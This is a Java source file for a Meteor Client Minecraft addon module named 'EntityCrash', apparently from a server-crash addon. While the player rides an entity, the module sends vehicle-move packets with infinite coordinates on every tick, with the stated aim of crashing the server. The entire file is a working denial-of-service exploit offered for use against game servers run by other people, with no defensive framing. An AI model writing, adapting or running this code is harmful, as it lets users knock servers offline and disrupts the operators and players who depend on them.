package widecat.meteorcrashaddon.modules;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.EnumSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.entity.Entity;
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
import widecat.meteorcrashaddon.CrashAddon;

public class EntityCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Modes> mode = sgGeneral.add(new EnumSetting.Builder<Modes>()
        .name("mode")
        .description("Which crash mode to use.")
        .defaultValue(Modes.DISMount)
        .build());

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build());

    public EntityCrash() {
        super(CrashAddon.CATEGORY, "entity-crash", "Tries to crash the server by using entities.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        Entity vehicle = mc.player.getVehicle();
        if (vehicle == null) {
            error("You must be riding an entity.");
            toggle();
            return;
        }

        switch (mode.get()) {
            case DISMount -> {
                vehicle.updatePositionAndAngles(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, 0, 0);
                mc.getNetworkHandler().sendPacket(new VehicleMoveC2SPacket(vehicle.getPos(), vehicle.getYaw(), vehicle.getPitch(), vehicle.isOnGround()));
            }
            case TP -> {
                vehicle.updatePositionAndAngles(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, 0, 0);
                mc.getNetworkHandler().sendPacket(new VehicleMoveC2SPacket(vehicle.getPos(), vehicle.getYaw(), vehicle.getPitch(), vehicle.isOnGround()));
            }
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    public enum Modes {
        DISMount,
        TP
    }
}